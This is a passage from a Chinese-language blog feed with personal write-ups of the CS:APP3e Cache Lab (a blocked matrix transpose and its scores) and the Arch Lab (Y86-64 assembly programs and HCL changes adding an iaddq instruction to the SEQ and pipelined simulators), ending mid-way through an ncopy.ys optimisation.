                <span class="n">B</span><span class="p">[</span><span class="n">k</span> <span class="o">+</span> <span class="mi">4</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">k</span> <span class="o">+</span> <span class="mi">4</span><span class="p">][</span><span class="n">i</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="c1">// step3: 正常转置最后一个</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">a4</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">4</span><span class="p">];</span>
                <span class="n">a5</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">5</span><span class="p">];</span>
                <span class="n">a6</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">6</span><span class="p">];</span>
                <span class="n">a7</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span> <span class="o">+</span> <span class="mi">7</span><span class="p">];</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">4</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a4</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">5</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a5</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">6</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a6</span><span class="p">;</span>
                <span class="n">B</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">7</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">a7</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p>运行<code class="language-plaintext highlighter-rouge">./test-trans -M 64 -N 64</code></p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 2 (Transpose 64*64 for 64 blocks): hits:9018, misses:1227, evictions:1195
</code></pre></div></div> <p>ok，misses &lt; 1300</p> <hr/> <p>最后是 61 * 67尺寸的矩阵转置</p> <p>尝试几次不同的分块暴力转置就行了</p> <p>对submission的函数搞个if-else来匹配一下就行</p> <p>然后注册函数</p> <p>最后运行<code class="language-plaintext highlighter-rouge">python2 ./dirver.py</code>: (命令取决于你机器的环境)</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Part A: Testing cache simulator
Running ./test-csim
                        Your simulator     Reference simulator
Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts
     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace
     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace
     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace
     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace
     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace
     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace
     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace
     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace
    27


Part B: Testing transpose function
Running ./test-trans -M 32 -N 32
Running ./test-trans -M 64 -N 64
Running ./test-trans -M 61 -N 67

Cache Lab summary:
                        Points   Max pts      Misses
Csim correctness          27.0        27
Trans perf 32x32           8.0         8         287
Trans perf 64x64           8.0         8        1227
Trans perf 61x67          10.0        10        1992
          Total points    53.0        53
</code></pre></div></div> <h1 id="最后">最后</h1> <p>实现cache和LRU的时候比较爽，其次是32x32的时候，比较痛苦的时候是64x64的时候，已经麻木到随便尝试blocking的时候是61x67</p> <p>总之，对cache复习了一下</p>]]></content><author><name></name></author><category term="CSAPP"/><category term="项目"/><category term="c"/><category term="csapp"/><category term="cache"/><category term="LRU"/><summary type="html"><![CDATA[Personal Crack on CS:APP3e Cache Lab]]></summary></entry><entry><title type="html">CS:APP3e Arch Lab</title><link href="https://iamnotphage.github.io/blog/2022/CSAPP3eArch/" rel="alternate" type="text/html" title="CS:APP3e Arch Lab"/><published>2022-06-03T15:59:00+00:00</published><updated>2022-06-03T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2022/CSAPP3eArch</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2022/CSAPP3eArch/"><![CDATA[<p>首先是安装好需要的内容。</p> <p><code class="language-plaintext highlighter-rouge">flex</code>, <code class="language-plaintext highlighter-rouge">bison</code></p> <p><code class="language-plaintext highlighter-rouge">gcc</code>和<code class="language-plaintext highlighter-rouge">make</code>就不多说了。</p> <p>然后根据自己情况调整<code class="language-plaintext highlighter-rouge">Makefile</code>(sim各级目录下的<code class="language-plaintext highlighter-rouge">Makefile</code>)</p> <blockquote> <p>笔者遇到-lfl找不到的情况，前往Makefile把LEXLIB = -lfl改成空就行了</p> <p>此外就是GUI mode的情况，我懒得安装tcl/tk直接把Makefile相关的注释就行</p> </blockquote> <p>仔细阅读<code class="language-plaintext highlighter-rouge">writeup</code>和书本<code class="language-plaintext highlighter-rouge">chapter 4</code></p> <h1 id="part-a">Part A</h1> <p>工作在<code class="language-plaintext highlighter-rouge">arch/sim/misc</code>目录下</p> <p>仿照书本<code class="language-plaintext highlighter-rouge">figure 4-7</code>并对照<code class="language-plaintext highlighter-rouge">example.c</code>容易写出<code class="language-plaintext highlighter-rouge">sum.ys</code>:</p> <p>(最后一行空行构成EOF)</p> <p>然后<code class="language-plaintext highlighter-rouge">./yas sum.ys</code>和<code class="language-plaintext highlighter-rouge">./yis sum.yo</code>检查<code class="language-plaintext highlighter-rouge">Status</code>和<code class="language-plaintext highlighter-rouge">%rax</code>是否正常</p> <pre><code class="language-asm"># Execution begins at address 0
        .pos 0
        irmovq stack, %rsp
        call main
        halt

# Sample linked list
.align 8
ele1:
        .quad 0x00a
        .quad ele2
ele2:
        .quad 0x0b0
        .quad ele3
ele3:
        .quad 0xc00
        .quad 0

main:
        irmovq  ele1, %rdi
        call    sum_list
        ret

# long sum_list(list_ptr ls)
# ls in %rdi
sum_list:
        xorq    %rax, %rax      # long val = 0;
loop:
        andq    %rdi, %rdi      # stop when %rdi == 0
        je      exit
        mrmovq  (%rdi), %r10
        addq    %r10, %rax      # val += ls -&gt; val;
        mrmovq  8(%rdi), %rdi
        jmp     loop
exit:
        ret

# Stack starts here and grows to lower addresses
	    .pos 0x200
stack:

</code></pre> <p>然后是<code class="language-plaintext highlighter-rouge">rsum.ys</code>:</p> <pre><code class="language-asm"># Execution begins at address 0
        .pos 0
        irmovq stack, %rsp
        call main
        halt

# Sample linked list
        .align 8
ele1:
        .quad 0x00a
        .quad ele2
ele2:
        .quad 0x0b0
        .quad ele3
ele3:
        .quad 0xc00
        .quad 0

main:
        irmovq  ele1, %rdi
        call    rsum_list
        ret

# long rsum_list(list_ptr ls)
# ls in %rdi
rsum_list:
        pushq   %rbx            # callee saved register
        xorq    %rax, %rax
        andq    %rdi, %rdi
        jne     else
        xorq    %rax, %rax
        jmp     exit
else:
        mrmovq  (%rdi), %rbx    # %rbx is val
        mrmovq  8(%rdi), %rdi	# %rdi = %rdi -&gt; next
        call    rsum_list
        addq    %rbx, %rax	    # val + rsum_list()
exit:
        popq	%rbx
        ret

# Stack starts here and grows to lower addresses
	    .pos 0x200
stack:

</code></pre> <p>最后是<code class="language-plaintext highlighter-rouge">copy.ys</code>也很简单，照着c代码写就行:</p> <pre><code class="language-asm"># Execution begins at address 0
        .pos 0
        irmovq stack, %rsp
        call main
        halt

        .align 8
# Source block
src:
        .quad 0x00a
        .quad 0x0b0
        .quad 0xc00
# Destination block
dest:
        .quad 0x111
        .quad 0x222
        .quad 0x333

main:
        irmovq  src, %rdi
        irmovq  dest, %rsi
        irmovq  $3, %rdx
        call    copy_block
        ret

# long copy_block(long *src, long *dest, long len)
# src in %rdi, dest in %rsi, len in %rdx
copy_block:
        irmovq  $8, %r9
        irmovq  $-1, %r10
        xorq    %rax, %rax

loop:
        andq    %rdx, %rdx
        je      exit

        mrmovq  (%rdi), %r8     # %r8 is val
        addq    %r9, %rdi
        rmmovq  %r8, (%rsi)
        addq    %r9, %rsi
        xorq    %r8, %rax
        addq    %r10, %rdx
        jmp     loop
exit:
        ret

# Stack starts here and grows to lower addresses
	    .pos 0x200
stack:

</code></pre> <p>最后这个<code class="language-plaintext highlighter-rouge">copy.ys</code>经过<code class="language-plaintext highlighter-rouge">./yas</code>编译<code class="language-plaintext highlighter-rouge">./yis</code>运行检查后，<code class="language-plaintext highlighter-rouge">%rax</code>的值仍然是<code class="language-plaintext highlighter-rouge">0xcba</code></p> <p>并且内存的内容相应地也改变。</p> <p>这个part有30分，每个文件10分。</p> <h1 id="part-b">Part B</h1> <p>在进行这部分内容时，请选确保已经阅读CS:APP3e的4.2章节和4.3章节</p> <p>首先通过前面的部分可以知道指令的字节码如下:</p> <p>表格一列代表4bit</p> <table> <thead> <tr> <th>0</th> <th>1</th> <th>2</th> <th>3</th> <th>4</th> <th>5</th> <th>…</th> <th>19</th> </tr> </thead> <tbody> <tr> <td>icode</td> <td>ifun</td> <td>rA</td> <td>rB</td> <td> </td> <td> </td> <td> </td> <td> </td> </tr> </tbody> </table> <p>后续的空格代表立即数(64bit)</p> <p>其次，要对执行一条指令的几个阶段了解(查看figure 4-18):</p> <ol> <li>取指</li> <li>译码</li> <li>执行</li> <li>访存</li> <li>写回</li> <li>更新PC</li> </ol> <p>所以要实现<code class="language-plaintext highlighter-rouge">iaddq</code>的指令，根据书本的描述:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C 0 F [rB] [V]
</code></pre></div></div> <p>前面的<code class="language-plaintext highlighter-rouge">icode</code>和<code class="language-plaintext highlighter-rouge">ifun</code>和<code class="language-plaintext highlighter-rouge">rA</code>都是固定的，<code class="language-plaintext highlighter-rouge">V</code>表示立即数。</p> <p>仿照课本的例子，<code class="language-plaintext highlighter-rouge">iaddq</code>的执行阶段也就是:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. icode:ifun &lt;- M1[PC]         # 开始取指
2. rA:rB      &lt;- M1[PC + 1]
3. valC       &lt;- M8[PC + 2]     # 64bit立即数
4. valP       &lt;- PC + 10        # 1B 指令类别 1B寄存器编号 8B立即数
5. valB       &lt;- R[rB]          # 开始译码
6. valE       &lt;- valC + valB    # 开始执行
7. R[rB]      &lt;- valE           # 开始写回
8. PC         &lt;- valP           # 更新PC
</code></pre></div></div> <p>到这一步，要确保阅读过<code class="language-plaintext highlighter-rouge">4.3.2</code>已经了解<code class="language-plaintext highlighter-rouge">SEQ</code>的硬件结构，方便对照修改<code class="language-plaintext highlighter-rouge">seq-full.hcl</code>文件</p> <hr/> <p>对照<code class="language-plaintext highlighter-rouge">figure 4-27</code>SEQ的取指阶段，修改<code class="language-plaintext highlighter-rouge">seq-full.hcl</code></p> <p>首先<code class="language-plaintext highlighter-rouge">seq-full.hcl</code>已经在42行定义了</p> <p><code class="language-plaintext highlighter-rouge">wordsig IIADDQ 'I_IADDQ'</code></p> <p>我们只需要到<code class="language-plaintext highlighter-rouge">fetch stage</code>修改对应的内容，修改它为valid指令，同时需要寄存器和常数。</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>################ Fetch Stage     ###################################

# Determine instruction code
word icode = [
	imem_error: INOP;
	1: imem_icode;		# Default: get from instruction memory
];

# Determine instruction function
word ifun = [
	imem_error: FNONE;
	1: imem_ifun;		# Default: get from instruction memory
];

bool instr_valid = icode in
	{ INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,
	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ };

# Does fetched instruction require a regid byte?
bool need_regids =
	icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ,
		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ };

# Does fetched instruction require a constant word?
bool need_valC =
	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ };
</code></pre></div></div> <hr/> <p>同样地，对照<code class="language-plaintext highlighter-rouge">figure 4-28</code>SEQ的译码和写回阶段，修改<code class="language-plaintext highlighter-rouge">seq-full.hcl</code></p> <p>我们的<code class="language-plaintext highlighter-rouge">iaddq</code>只需要用到<code class="language-plaintext highlighter-rouge">rB</code>表示的寄存器，并且写回<code class="language-plaintext highlighter-rouge">rB</code>寄存器，不需要根据<code class="language-plaintext highlighter-rouge">Cnd</code>条件信号进行操作。</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>################ Decode Stage    ###################################

## What register should be used as the A source?
word srcA = [
	icode in { IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  } : rA;
	icode in { IPOPQ, IRET } : RRSP;
	1 : RNONE; # Don't need register
];

## What register should be used as the B source?
word srcB = [
	icode in { IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  } : rB;
	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don't need register
];

## What register should be used as the E destination?
word dstE = [
	icode in { IRRMOVQ } &amp;&amp; Cnd : rB;
	icode in { IIRMOVQ, IOPQ, IIADDQ} : rB;
	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don't write any register
];

## What register should be used as the M destination?
word dstM = [
	icode in { IMRMOVQ, IPOPQ } : rA;
	1 : RNONE;  # Don't write any register
];
</code></pre></div></div> <hr/> <p>同样继续，继续<code class="language-plaintext highlighter-rouge">figure 4-29</code>来修改执行阶段的<code class="language-plaintext highlighter-rouge">.hcl</code></p> <p>在ALU的输入口中，A口输入valC, B口输入valC, 同时设定条件码(因为本质上同IOPQ)</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>################ Execute Stage   ###################################

## Select input A to ALU
word aluA = [
	icode in { IRRMOVQ, IOPQ } : valA;
	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ } : valC;
	icode in { ICALL, IPUSHQ } : -8;
	icode in { IRET, IPOPQ } : 8;
	# Other instructions don't need ALU
];

## Select input B to ALU
word aluB = [
	icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL,
		      IPUSHQ, IRET, IPOPQ, IIADDQ } : valB;
	icode in { IRRMOVQ, IIRMOVQ } : 0;
	# Other instructions don't need ALU
];

## Set the ALU function
word alufun = [
	icode == IOPQ : ifun;
	1 : ALUADD;
];

## Should the condition codes be updated?
bool set_cc = icode in { IOPQ, IIADDQ };
</code></pre></div></div> <hr/> <p><code class="language-plaintext highlighter-rouge">iaddq</code>不需要访问内存。</p> <p>访存阶段跳过，直接到更新PC:</p> <p>更新PC阶段，发现并不需要修改，因为默认就是通过<code class="language-plaintext highlighter-rouge">valP</code>来更新PC</p> <hr/> <p>最后make，测试就行。</p> <p>in <code class="language-plaintext highlighter-rouge">sim/seq</code></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix <span class="o">&gt;</span> make clean
unix <span class="o">&gt;</span> make <span class="nv">VERSION</span><span class="o">=</span>full
unix <span class="o">&gt;</span> ./ssim <span class="nt">-t</span> ../y86-code/asumi.yo <span class="c"># init test</span>
unix <span class="o">&gt;</span> <span class="nb">cd</span> ../y86-code<span class="p">;</span> make testssim  <span class="c"># benchmark test</span>
unix <span class="o">&gt;</span> <span class="nb">cd</span> ../ptest<span class="p">;</span> make <span class="nv">SIM</span><span class="o">=</span>../seq/ssim <span class="nv">TFLAGS</span><span class="o">=</span><span class="nt">-i</span> <span class="c"># regression test</span>
</code></pre></div></div> <p>ALL SUCCEED就行</p> <h1 id="part-c">Part C</h1> <p><code class="language-plaintext highlighter-rouge">Part A</code>熟悉这个模拟的Y86架构</p> <p><code class="language-plaintext highlighter-rouge">Part B</code>熟悉指令顺序执行的情况，包括取指译码执行等操作，但是没有流水线，导致硬件浪费和效率感人。</p> <p>这个<code class="language-plaintext highlighter-rouge">Part</code>将针对流水线进行优化<code class="language-plaintext highlighter-rouge">ncopy.ys</code>的性能。</p> <p>在进行之前，请先确保阅读<code class="language-plaintext highlighter-rouge">4.4</code>和<code class="language-plaintext highlighter-rouge">4.5</code>，了解流水线的概念，SEQ+和SEQ的区别，了解流水线寄存器以及仔细查看<code class="language-plaintext highlighter-rouge">figur 4-41</code>。此外，<code class="language-plaintext highlighter-rouge">writeup</code>说阅读<code class="language-plaintext highlighter-rouge">5.8</code>的<code class="language-plaintext highlighter-rouge">loop unrolling</code>会有帮助。</p> <p>总之，终极目标是优化<code class="language-plaintext highlighter-rouge">ncopy.ys</code>的性能，观察其代码发现</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="nf">You</span> <span class="nv">can</span> <span class="nv">modify</span> <span class="nv">this</span> <span class="nv">portion</span>
	<span class="err">#</span> <span class="nf">Loop</span> <span class="nv">header</span>
	<span class="nf">xorq</span> <span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="o">%</span><span class="nb">rax</span>		<span class="err">#</span> <span class="nv">count</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">;</span>
	<span class="nf">andq</span> <span class="o">%</span><span class="nb">rdx</span><span class="p">,</span><span class="o">%</span><span class="nb">rdx</span>		<span class="err">#</span> <span class="nv">len</span> <span class="o">&lt;</span><span class="err">=</span> <span class="mi">0</span><span class="nv">?</span>
	<span class="nf">jle</span> <span class="nv">Done</span>		<span class="err">#</span> <span class="nv">if</span> <span class="nv">so</span><span class="p">,</span> <span class="nv">goto</span> <span class="nv">Done</span><span class="p">:</span>

<span class="nl">Loop:</span>	<span class="nf">mrmovq</span> <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r10</span>	<span class="err">#</span> <span class="nv">read</span> <span class="nv">val</span> <span class="nv">from</span> <span class="nv">src...</span>
	<span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r10</span><span class="p">,</span> <span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>	<span class="err">#</span> <span class="nv">...and</span> <span class="nv">store</span> <span class="nv">it</span> <span class="nv">to</span> <span class="nb">ds</span><span class="nv">t</span>
	<span class="nf">andq</span> <span class="o">%</span><span class="nv">r10</span><span class="p">,</span> <span class="o">%</span><span class="nv">r10</span>		<span class="err">#</span> <span class="nv">val</span> <span class="o">&lt;</span><span class="err">=</span> <span class="mi">0</span><span class="nv">?</span>
	<span class="nf">jle</span> <span class="nv">Npos</span>		<span class="err">#</span> <span class="nv">if</span> <span class="nv">so</span><span class="p">,</span> <span class="nv">goto</span> <span class="nv">Npos</span><span class="p">:</span>
	<span class="nf">irmovq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nv">r10</span>
	<span class="nf">addq</span> <span class="o">%</span><span class="nv">r10</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>		<span class="err">#</span> <span class="nv">count</span><span class="o">++</span>
<span class="nl">Npos:</span>	<span class="nf">irmovq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nv">r10</span>
	<span class="nf">subq</span> <span class="o">%</span><span class="nv">r10</span><span class="p">,</span> <span class="o">%</span><span class="nb">rdx</span>		<span class="err">#</span> <span class="nv">len</span><span class="o">--</span>
	<span class="nf">irmovq</span> <span class="kc">$</span><span class="mi">8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r10</span>
	<span class="nf">addq</span> <span class="o">%</span><span class="nv">r10</span><span class="p">,</span> <span class="o">%</span><span class="nb">rdi</span>		<span class="err">#</span> <span class="nv">src</span><span class="o">++</span>
	<span class="nf">addq</span> <span class="o">%</span><span class="nv">r10</span><span class="p">,</span> <span class="o">%</span><span class="nb">rsi</span>		<span class="err">#</span> <span class="nb">ds</span><span class="nv">t</span><span class="o">++</span>
	<span class="nf">andq</span> <span class="o">%</span><span class="nb">rdx</span><span class="p">,</span><span class="o">%</span><span class="nb">rdx</span>		<span class="err">#</span> <span class="nv">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="nv">?</span>
	<span class="nf">jg</span> <span class="nv">Loop</span>			<span class="err">#</span> <span class="nv">if</span> <span class="nv">so</span><span class="p">,</span> <span class="nv">goto</span> <span class="nv">Loop</span><span class="p">:</span>
</code></pre></div></div> <p>有多个地方用到了这样的一套招数:</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">irmovq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nv">r10</span>
<span class="nf">addq</span>   <span class="o">%</span><span class="nv">r10</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
</code></pre></div></div> <p>因为原本的<code class="language-plaintext highlighter-rouge">OPq</code>不支持立即数直接和寄存器运算。如果我们实现<code class="language-plaintext highlighter-rouge">iaddq</code>会不会有优化呢？(Let’s figure it out.)</p> <h2 id="实现iaddq">实现IADDQ</h2> <p>这里的实现<code class="language-plaintext highlighter-rouge">iaddq</code>和<code class="language-plaintext highlighter-rouge">Part B</code>的差别不大。</p> <p>记得对照<code class="language-plaintext highlighter-rouge">4.5.7 PIPE各个阶段的实现</code>来修改<code class="language-plaintext highlighter-rouge">pipe-full.hcl</code></p> <h3 id="fetch-stage">Fetch Stage</h3> <p>取指阶段修改三个字段的内容，同<code class="language-plaintext highlighter-rouge">Part B</code>一样：<code class="language-plaintext highlighter-rouge">instr_valid</code>, <code class="language-plaintext highlighter-rouge">need_regids</code>, <code class="language-plaintext highlighter-rouge">need_valC</code>(其他没涉及)</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Is instruction valid?
bool instr_valid = f_icode in
	{ INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,
	  IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ };

# Determine status code for fetched instruction
word f_stat = [
	imem_error: SADR;
	!instr_valid : SINS;
	f_icode == IHALT : SHLT;
	1 : SAOK;
];

# Does fetched instruction require a regid byte?
bool need_regids =
	f_icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ,
		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ };

# Does fetched instruction require a constant word?
bool need_valC =
	f_icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ };
</code></pre></div></div> <h3 id="decode--write-back-stage">Decode &amp; Write Back Stage</h3> <p>译码阶段，跟<code class="language-plaintext highlighter-rouge">Part B</code>一样，需要<code class="language-plaintext highlighter-rouge">B source</code>和<code class="language-plaintext highlighter-rouge">E destination</code></p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>## What register should be used as the B source?
word d_srcB = [
	D_icode in { IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  } : D_rB;
	D_icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don't need register
];

## What register should be used as the E destination?
word d_dstE = [
	D_icode in { IRRMOVQ, IIRMOVQ, IOPQ, IIADDQ} : D_rB;
	D_icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don't write any register
];
</code></pre></div></div> <h3 id="execute-stage">Execute Stage</h3> <p>还是一样，<code class="language-plaintext highlighter-rouge">aluA</code>, <code class="language-plaintext highlighter-rouge">aluB</code>, <code class="language-plaintext highlighter-rouge">set_cc</code>(同正常的<code class="language-plaintext highlighter-rouge">OPq</code>)</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>## Select input A to ALU
word aluA = [
	E_icode in { IRRMOVQ, IOPQ } : E_valA;
	E_icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ } : E_valC;
	E_icode in { ICALL, IPUSHQ } : -8;
	E_icode in { IRET, IPOPQ } : 8;
	# Other instructions don't need ALU
];

## Select input B to ALU
word aluB = [
	E_icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL,
		     IPUSHQ, IRET, IPOPQ, IIADDQ } : E_valB;
	E_icode in { IRRMOVQ, IIRMOVQ } : 0;
	# Other instructions don't need ALU
];

## Set the ALU function
word alufun = [
	E_icode == IOPQ : E_ifun;
	1 : ALUADD;
];

## Should the condition codes be updated?
bool set_cc = E_icode in { IOPQ, IIADDQ } &amp;&amp;
	# State changes only during normal operation
	!m_stat in { SADR, SINS, SHLT } &amp;&amp; !W_stat in { SADR, SINS, SHLT };
</code></pre></div></div> <h3 id="memory-stage">Memory Stage</h3> <p><code class="language-plaintext highlighter-rouge">iaddq</code>不涉及。</p> <h3 id="pipeline-register-control">Pipeline Register Control</h3> <p><code class="language-plaintext highlighter-rouge">iaddq</code>因为没有涉及内存访问，所以不会出现加载/使用冒险，所以此处也不涉及。</p> <h3 id="测试pipe-fullhcl">测试pipe-full.hcl</h3> <p>阅读<code class="language-plaintext highlighter-rouge">writeup</code>关于build和run的部分，查看如何测试程序。</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix <span class="o">&gt;</span> ./psim <span class="nt">-t</span> ../y86-code/asumi.yo
unix <span class="o">&gt;</span> <span class="nb">cd</span> ../ptest/<span class="p">;</span> make <span class="nv">SIM</span><span class="o">=</span>../pipe/psim <span class="nv">TFLAGS</span><span class="o">=</span><span class="nt">-i</span>
</code></pre></div></div> <h2 id="优化ncopyys">优化ncopy.ys</h2> <p>在优化之前，先看看我们怎么build和run我们的程序。</p> <p>在<code class="language-plaintext highlighter-rouge">writeup</code>中的<code class="language-plaintext highlighter-rouge">Evaluation</code>中说明了这个部分的目标:</p> <blockquote> <p>You should be able to achieve an average CPE of less than 9.00. Our best version averages 7.48.</p> </blockquote> <p>我们要将CPE(Cycles Per Element)降低到9.0就算合格。</p> <p>先看看0优化的程序。</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix <span class="o">&gt;</span> ./correctness.pl <span class="nt">-p</span>
unix <span class="o">&gt;</span> ./benchmark.pl
</code></pre></div></div> <p>得分为0.0/60.0, Average CPE = 15.18</p> <p>make sense……</p> <p>把我们最初的设想(<code class="language-plaintext highlighter-rouge">iaddq</code>替换原本的内容)实现一下:</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="nf">You</span> <span class="nv">can</span> <span class="nv">modify</span> <span class="nv">this</span> <span class="nv">portion</span>
	<span class="err">#</span> <span class="nf">Loop</span> <span class="nv">header</span>
	<span class="nf">xorq</span> <span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="o">%</span><span class="nb">rax</span>		<span class="err">#</span> <span class="nv">count</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">;</span>
	<span class="nf">andq</span> <span class="o">%</span><span class="nb">rdx</span><span class="p">,</span><span class="o">%</span><span class="nb">rdx</span>		<span class="err">#</span> <span class="nv">len</span> <span class="o">&lt;</span><span class="err">=</span> <span class="mi">0</span><span class="nv">?</span>
	<span class="nf">jle</span> <span class="nv">Done</span>		<span class="err">#</span> <span class="nv">if</span> <span class="nv">so</span><span class="p">,</span> <span class="nv">goto</span> <span class="nv">Done</span><span class="p">:</span>

<span class="nl">Loop:</span>	<span class="nf">mrmovq</span> <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r10</span>	<span class="err">#</span> <span class="nv">read</span> <span class="nv">val</span> <span class="nv">from</span> <span class="nv">src...</span>
	<span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r10</span><span class="p">,</span> <span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>	<span class="err">#</span> <span class="nv">...and</span> <span class="nv">store</span> <span class="nv">it</span> <span class="nv">to</span> <span class="nb">ds</span><span class="nv">t</span>
	<span class="nf">andq</span> <span class="o">%</span><span class="nv">r10</span><span class="p">,</span> <span class="o">%</span><span class="nv">r10</span>		<span class="err">#</span> <span class="nv">val</span> <span class="o">&lt;</span><span class="err">=</span> <span class="mi">0</span><span class="nv">?</span>
	<span class="nf">jle</span> <span class="nv">Npos</span>		<span class="err">#</span> <span class="nv">if</span> <span class="nv">so</span><span class="p">,</span> <span class="nv">goto</span> <span class="nv">Npos</span><span class="p">:</span>
	<span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>		<span class="err">#</span> <span class="nv">count</span><span class="o">++</span>
<span class="nl">Npos:</span>
